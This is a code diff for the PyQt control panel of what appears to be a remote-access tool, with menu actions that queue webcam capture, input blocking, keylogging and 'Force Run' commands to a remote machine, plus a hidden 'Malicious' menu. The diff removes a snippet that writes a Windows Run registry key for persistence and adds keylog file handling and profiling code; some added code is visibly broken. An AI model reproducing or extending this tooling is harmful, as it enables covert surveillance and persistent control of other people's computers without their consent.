@@ -10,9 +10,9 @@ from json import load, dump, decoder
 
 from UI.SaveWindow import SaveWin
 from UI.ConnectionWindow import ConnWin
+from UI.GeneralSettingsWindow import GeneralSettingsWin
 from UI.UISettingsWindow import UISettingsWin
 from UI.Palettes import WhitePalette, DarkPalette, MidnightPalette
-
 
 from mssServ import Server
 from mssClient import Client
@@ -35,6 +35,9 @@ palettes = {
 defaultSettings = {
                 "outputFile": "",
                 "theme": "White (default)",
+                "fps limit": "24",
+                "resolution width": "800",
+                "resolution height": "600",
                 "showFps": False
             }
 
@@ -43,17 +46,10 @@ class Window(QMainWindow, Ui_MainWindow):
     def __init__(self, App, parent=None):
         super().__init__(parent)
         self.setupUi(self)  #read & load the compiled .ui file
+        self.setFocus()
+        self.menuMalicious.menuAction().setVisible(False)
 
-        #self.addAction(self.action_Save_To)
-        #self.addAction(self.action_UI)
-        #self.addAction(self.action_Exit)
-        #self.addAction(self.action_Fullscreen)
-        #self.addAction(self.action_Connect)
-        #self.addAction(self.action_Disconnect)
-        #self.addAction(self.action_Bind)
-        #self.addAction(self.action_Close)
-        #self.menuMalicious.menuAction().setVisible(False)
-
+        self.logger = None
         self.cmdQueue = deque(maxlen=1024)
 
         self.fullscreenExitShortcut = QShortcut('ESC', self)
@@ -61,8 +57,10 @@ class Window(QMainWindow, Ui_MainWindow):
 
         self.app = App
         self.app.aboutToQuit.connect(self.closeEvent)
+        self.app.focusChanged.connect(self.focusChangedEvent)
 
-        self.settingsDict = self.ReadFromJson()     #load the saved settings
+        #load the saved settings from config file and apply them
+        self.settingsDict = self.ReadFromJson()
         tempTheme = self.settingsDict["theme"]
         self.settingsDict["theme"] = "White (default)"
         self.ChangeTheme(tempTheme)
@@ -75,6 +73,7 @@ class Window(QMainWindow, Ui_MainWindow):
 
 
     def ToggleFullscreen(self, newState):
+        print(bool(newState))
         self.setWindowState(newState)
         self.menubar.setHidden(newState)
         self.statusbar.setHidden(newState)
@@ -145,6 +144,16 @@ class Window(QMainWindow, Ui_MainWindow):
             event.ignore()
 
 
+    def focusChangedEvent(self, shifted_from, shifted_to):
+        #toggle cursor when not focused on the main window
+        self.label.toggleCursor(self.isActiveWindow())
+
+
+    #this is to provide a pickle-able function for multiprocessing (class methods can't be pickled)
+    def procHandler():
+        self.server.__start()
+
+
     @pyqtSlot()
     def on_action_Exit_triggered(self):
         self.close()    #fire the close event
@@ -153,6 +162,11 @@ class Window(QMainWindow, Ui_MainWindow):
     @pyqtSlot()
     def on_action_Save_To_triggered(self):
         self.OpenWin(SaveWin, "Select Output")
+
+
+    @pyqtSlot()
+    def on_action_General_triggered(self):
+        self.OpenWin(GeneralSettingsWin, "Settings")
 
 
     @pyqtSlot()
@@ -203,43 +217,42 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Start_Cam_triggered(self):
-        self.cmdQueue.append("Start Cam")
+        self.cmdQueue.append(("Start Cam"))
 
 
     @pyqtSlot()
     def on_action_Stop_Cam_triggered(self):
-        self.cmdQueue.append("Stop Cam")
+        self.cmdQueue.append(("Stop Cam"))
 
 
     @pyqtSlot()
     def on_action_Force_Run_triggered(self):
-        self.cmdQueue.append("Force Run")
-        keyHandle = OpenKeyEx(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=KEY_SET_VALUE)
-        SetValueEx(keyHandle, "remote", 0, REG_SZ, dirname(realpath(__file__)) + r"\helpers\run.py")
-        CloseKey(keyHandle)
+        self.cmdQueue.append(("Force Run"))
 
 
     @pyqtSlot()
     def on_action_Block_Input_triggered(self):
-        self.cmdQueue.append("Block Input")
+        self.cmdQueue.append(("Block Input"))
 
 
     @pyqtSlot()
     def on_action_Unblock_Input_triggered(self):
-        self.cmdQueue.append("Unblock Input")
+        self.cmdQueue.append(("Unblock Input"))
 
 
     @pyqtSlot()
     def on_action_Start_KeyLogger_triggered(self):
-        self.cmdQueue.append("Start KeyLogger")
+        self.cmdQueue.append(("Start KeyLogger"))
+        self.logger = open(__file__ + r"\logger.txt", 'w')
 
 
     @pyqtSlot()
     def on_action_Stop_KeyLogger_triggered(self):
-        self.cmdQueue.append("Stop KeyLogger")
+        self.cmdQueue.append(("Stop KeyLogger"))
+        self.logger.close()
 
 
-if __name__ == '__main__':
+def main():
     app = QApplication(argv)
     app.setStyle('Fusion')
     window = Window(app)
@@ -249,4 +262,31 @@ if __name__ == '__main__':
     window.show()
     app.exec_()
     print('\n'.join(repr(w) for w in app.allWidgets()))
-    sysExit()
+    #sysExit()
+
+if __name__ == '__main__':
+    import yappi
+    from time import perf_counter
+
+    yappi.start()
+    s = perf_counter()
+    main()
+    print(perf_counter() - s)
+    yappi.stop()
+
+    threads = yappi.get_thread_stats()
+    for thread in threads:
+        print(
+            "Function stats for (%s) (%d)" % (thread.name, thread.id)
+        )  # it is the Thread.__class__.__name__
+        yappi.get_func_stats(ctx_id=thread.id).print_all()
+
+    """import pstats
+    import cProfile
+
+    with cProfile.Profile() as pr:
+        main()
+
+    s = pstats.Stats(pr)
+    s.sort_stats(pstats.SortKey.TIME)
+    s.print_stats()"""
